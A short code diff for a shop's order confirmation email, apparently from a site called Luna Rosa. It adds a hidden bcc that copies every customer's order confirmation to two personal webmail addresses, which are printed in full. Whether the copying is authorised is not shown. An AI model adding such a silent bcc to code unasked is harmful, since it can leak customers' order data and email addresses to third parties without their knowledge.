@@ -158,6 +158,12 @@ Luna Rosa
 
         to: order.customer_email,
 
+        bcc: [
+          "michael_mellizo@hotmail.com", 
+          "lizet323z@gmail.com"
+        ],
+
+       
         subject: `Hemos recibido tu pedido #${order.order_number}`,
 
         html: orderConfirmationEmail(order),
